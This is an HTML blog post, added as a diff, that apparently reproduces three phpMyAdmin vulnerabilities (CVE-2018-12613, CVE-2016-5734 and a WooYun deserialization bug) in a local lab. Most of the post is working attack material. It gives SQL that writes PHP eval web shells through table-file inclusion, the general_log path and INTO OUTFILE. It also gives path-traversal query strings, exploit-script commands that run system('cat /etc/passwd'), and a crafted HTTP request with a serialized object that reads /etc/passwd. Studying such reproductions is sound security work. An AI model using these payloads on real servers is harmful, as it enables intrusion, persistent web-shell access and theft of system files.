@@ -1,0 +1,329 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>phpmyadmin漏洞复现 - xiaofeiji&#39;s Blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Xiaofeiji,"> 
+    <meta name="description" content="phpmyadmin4.8.1远程文件包含漏洞（CVE-2018-12613）受影响版本phpMyAdmin 4.8.0和4.8.1
+
+漏洞分析在路上了…….
+复现过程
+利用文件包含进行getshe,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="xiaofeiji&#39;s Blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.jpg"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+   </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="loading">
+    <span id="config-title" style="display:none">xiaofeiji&#39;s Blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">phpmyadmin漏洞复现</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">phpmyadmin漏洞复现</h1>
+        <div class="stuff">
+            <span>八月 07, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h2 id="phpmyadmin4-8-1远程文件包含漏洞（CVE-2018-12613）"><a href="#phpmyadmin4-8-1远程文件包含漏洞（CVE-2018-12613）" class="headerlink" title="phpmyadmin4.8.1远程文件包含漏洞（CVE-2018-12613）"></a>phpmyadmin4.8.1远程文件包含漏洞（CVE-2018-12613）</h2><h3 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h3><p>phpMyAdmin 4.8.0和4.8.1</p>
+<p><img src="4.8.1-1.png"></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在路上了…….</p>
+<h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><ol>
+<li>利用文件包含进行getshell</li>
+</ol>
+<p>执行语句查询数据库的路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &quot;%datadir%&quot;; 或 select @@datadir;</span><br></pre></td></tr></table></figure>
+
+<p><img src="4.8.1-3.png"></p>
+<p>查询到数据库的路径为：</p>
+<p>C:\phpstudy\PHPTutorial\MYSQL\data\</p>
+<p>创建一个数据库rce，表rce，字段code，向其中写入一句话木马：<?php phpinfo(); ?></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE rce; </span><br><span class="line"></span><br><span class="line">use rce; </span><br><span class="line"></span><br><span class="line">CREATE TABLE rce(code varchar(100)); </span><br><span class="line"></span><br><span class="line">INSERT INTO rce(code) VALUES(&quot;&lt;?php phpinfo(); ?&gt;&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="4.8.1-4.png"></p>
+<p>可以看到我们已经成功写入了对应内容。</p>
+<p>文件的路径就是：data路径+数据库名/表名.frm ,然后包含它就可以，成功包含执行phpinfo</p>
+<p><strong>?target=db_datadict.php%253f/../../../../../../../../../phpstudy/PHPTutorial/MySQL/data/rce/rce.frm</strong></p>
+<p><img src="4.8.1-5.png"></p>
+<p>如果包含的是MYD文件，可以看到phpinfo的内容被直接解析出来：</p>
+<p><strong>?target=db_datadict.php%253f/../../../../../../../../../phpstudy/PHPTutorial/MySQL/data/rce/rce.MYD</strong></p>
+<p><img src="4.8.1-6.png"></p>
+<p><strong>（1）*.frm–表定义，是描述表结构的文件。</strong></p>
+<p><strong>（2）*.MYD–”D”数据信息文件，是表的数据文件。</strong></p>
+<p><strong>（3）*.MYI–”I”索引信息文件，是表数据文件中任何索引的数据树。</strong></p>
+<p>新建一个表，表名一定要填，字段内容写入一句话木马：</p>
+<p>接下来我们通过制作一个表，字段名为一句话木马，上传后通过文件路径的包含，连接蚁剑，应该就可以getshell。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">&quot;a.php&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="string">&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="4.8.1-7.png"></p>
+<p>保存后，访问包含文件的frm文件，就可在phpmyadmin的当前目录下生成一个a.php的文件：</p>
+<p><strong>？target=db_datadict.php%253f/../../../../../../../../../phpstudy/PHPTutorial/MySQL/data/rce/xiaofeiji.frm</strong></p>
+<p><img src="4.8.1-9.png"></p>
+<p><img src="4.8.1-10.png"></p>
+<p>成功连上蚁剑。</p>
+<ol start="2">
+<li>利用session文件改变写入日志文件的路径</li>
+</ol>
+<p>​    general_log 指定日志保存状态，一共有两个值（ON/OFF）ON代表开启 OFF代表关闭。</p>
+<p>​    general_log file 指的是日志的保存路径</p>
+<p>mysql 5.0版本以上会创建日志文件，修改日志的全局变量，也可以getshell。但是也要对生成的日志有可读可写的权限。</p>
+<p>查看日志状态：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#x27;general%&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="4.8.1-12.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET GLOBAL general_log=&#x27;on&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="4.8.1-13.png"></p>
+<p>当 general_log=ON 时，所执行的sql语句都会出现在 /var/lib/mysql/1e164993aaf5.log 文件。那么，如果把 general_log_file 的路径修改为 /var/lib/mysql/1.php，那么所执行的sql语句就会保存在1.php中，如果我们执行一个一句话木马，就可以getshell：</p>
+<p>所以当我们把路径改为C:/phpstudy/PHPTutorial/WWW/1.php时就会在对应位置生成一个文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET GLOBAL general_log_file=&#x27;C:/phpstudy/PHPTutorial/WWW/1.php&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="4.8.1-14.png"></p>
+<p>再次查看日志路径，发现它已经变成了我们修改后的路径，说明当select木马时，对应的内容会保存在我们设置的路径下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#x27;general%&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="4.8.1-15.png"></p>
+<p>将一句话木马写入1.php文件，既然是日志文件，我们select查询的SQL语句内容自然也会被保存在日志里面：</p>
+<p><strong>SELECT ‘<?php @eval($_POST[fox]); ?>‘</strong></p>
+<p>这时候相当于我们把<?php @eval($_POST[fox]); ?>  写入到日志 1.php中，我们尝试访问日志文件：1.php:</p>
+<p><img src="4.8.1-16.png"></p>
+<p>发现内容已经被解析了。</p>
+<p>连接蚁剑，成功getshell。</p>
+<ol start="3">
+<li>直接插入语句执行</li>
+</ol>
+<p>可以在phpinfo中查看到网站的根目录：C:/phpstudy/PHPTutorial/WWW</p>
+<p><img src="4.8.1-19.png"></p>
+<p>接下来我们执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;INTO OUTFILE &#x27;C:/phpstudy/PHPTutorial/WWW/shell.php&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>语句执行之后会在对应根目录下生成一个shell.php文件，并插入一句话木马，因此连接蚁剑可以成功getshell。</p>
+<p>但是，上传的时候发现：</p>
+<p><img src="4.8.1-20.png"></p>
+<p>报错了，语句无法执行，可以看到跟secure_file_priv有关，百度了解到在插入一句话木马之前要先检测插入的条件是否被允许：</p>
+<p>检测语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>显示是NULL值，这样的情况下我们插入一句话是无法插入的，需要我们修改secure_file_priv=’’为空值才能插入一句话：</p>
+<p>secure_file_priv为null 表示不允许导入导出；</p>
+<p>secure_file_priv指定文件夹时，表示mysql的导入导出只能在指定的文件夹；</p>
+<p>secure_file_priv没有设置时，则表示没有任何限制；</p>
+<p><img src="4.8.1-21.png"></p>
+<p>我们需要在配置文件中对其进行修改，没有则添加：</p>
+<p><strong>secure_file_priv=’’</strong></p>
+<p><img src="4.8.1-22.png"></p>
+<p>然后重启一下phpstudy，就能正常执行。</p>
+<p><img src="4.8.1-24.png"></p>
+<p>然后通过蚁剑进行连接。</p>
+<ol start="4">
+<li>参考文章</li>
+</ol>
+<p>getshell的方法：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/105788084">https://blog.csdn.net/qq_45521281/article/details/105788084</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.xctf.org.cn/library/details/4bc41644f3eea6884d4a860a82bdc8db6dc15576/">https://www.xctf.org.cn/library/details/4bc41644f3eea6884d4a860a82bdc8db6dc15576/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41901122/article/details/104718333">https://blog.csdn.net/qq_41901122/article/details/104718333</a></p>
+<hr>
+<h2 id="phpmyadmin后台远程代码执行漏洞（CVE-2016-5734）"><a href="#phpmyadmin后台远程代码执行漏洞（CVE-2016-5734）" class="headerlink" title="phpmyadmin后台远程代码执行漏洞（CVE-2016-5734）"></a>phpmyadmin后台远程代码执行漏洞（CVE-2016-5734）</h2><h3 id="受影响版本-1"><a href="#受影响版本-1" class="headerlink" title="受影响版本"></a>受影响版本</h3><p>Phpmyadmin -&gt; 4.0.10.16之前的4.0.x版本</p>
+<p>4.4.15.7 之前的 4.4.x版本</p>
+<p>4.6.3之前的 4.6.x版本</p>
+<p>Php版本： 4.3.0 ~5.4.6</p>
+<p>Php 5.0 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>preg_replace漏洞触发有两个前提：</p>
+<p>preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</p>
+<p>01：第一个参数需要/e修正符，有了它可以执行第二个参数的命令</p>
+<p>02：第一个参数需要在第三个参数中的中有匹配，不然echo会返回第三个参数而不执行命令。</p>
+<h3 id="复现过程-1"><a href="#复现过程-1" class="headerlink" title="复现过程"></a>复现过程</h3><p>POC攻击源码：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/40185">https://www.exploit-db.com/exploits/40185</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python phpmyadmin_CVE-<span class="number">2016</span>-<span class="number">5734</span>.py -u root -p <span class="string">&quot;root&quot;</span> http:<span class="comment">//192.168.1.7:8080 -c &quot;system(&#x27;id&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line">python phpmyadmin_CVE-<span class="number">2016</span>-<span class="number">5734</span>.py -u root -p <span class="string">&quot;root&quot;</span> http:<span class="comment">//192.168.1.7:8080 -c &quot;system(&#x27;cat /etc/passwd&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>其中可以使用 -c 指定PHP 代码执行（这里未指定使用代码中默认的system(‘uname -a’)）</p>
+<p>-d 指定数据库名</p>
+<p>-t 指定用户所创建的表名（这里未指定使用代码中默认的）</p>
+<p><img src="1.png"></p>
+<hr>
+<h2 id="phpmyadmin反序列化漏洞（WooYun-2016-199433）"><a href="#phpmyadmin反序列化漏洞（WooYun-2016-199433）" class="headerlink" title="phpmyadmin反序列化漏洞（WooYun-2016-199433）"></a>phpmyadmin反序列化漏洞（WooYun-2016-199433）</h2><h3 id="受影响版本-2"><a href="#受影响版本-2" class="headerlink" title="受影响版本"></a>受影响版本</h3><p>phpmyadmin2.x</p>
+<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a target="_blank" rel="noopener" href="https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/">https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/</a></p>
+<h3 id="复现过程-2"><a href="#复现过程-2" class="headerlink" title="复现过程"></a>复现过程</h3><ol>
+<li><p>漏洞存在的文件：/scripts/setup.php</p>
+</li>
+<li><p>登录网站访问漏洞文件：/scripts/setup.php</p>
+<p>开启burp抓包，将数据包替换成如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /scripts/setup.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: your-ip:<span class="number">8080</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 80</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">action=test&amp;configuration=O:10:&quot;PMA_Config&quot;:1:&#123;s:6:&quot;source&quot;,s:11:&quot;/etc/passwd&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>攻击语句：</p>
+<p><strong>action=test&amp;configuration=O:10:”PMA_Config”:1:{s:6:”source”,s:11:”/etc/passwd”;}</strong></p>
+</li>
+</ol>
+<p><img src="2.png"></p>
+<p><img src="3.png"></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable=''
+        data-ae=''
+        data-ci=''
+        data-cs=''
+        data-r='xiaofeiji-77.github.io'
+        data-o='xiaofeiji-77'
+        data-a='xiaofeiji-77'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#phpmyadmin4-8-1%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-12613%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">phpmyadmin4.8.1远程文件包含漏洞（CVE-2018-12613）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%97%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">1.1.</span> <span class="toc-text">受影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="toc-number">1.3.</span> <span class="toc-text">复现过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpmyadmin%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-5734%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">phpmyadmin后台远程代码执行漏洞（CVE-2016-5734）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%97%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-1"><span class="toc-number">2.1.</span> <span class="toc-text">受影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B-1"><span class="toc-number">2.3.</span> <span class="toc-text">复现过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpmyadmin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88WooYun-2016-199433%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">phpmyadmin反序列化漏洞（WooYun-2016-199433）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%97%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-2"><span class="toc-number">3.1.</span> <span class="toc-text">受影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B-2"><span class="toc-number">3.3.</span> <span class="toc-text">复现过程</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+   
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/canvas-nest.min.js"></script>
+</html>
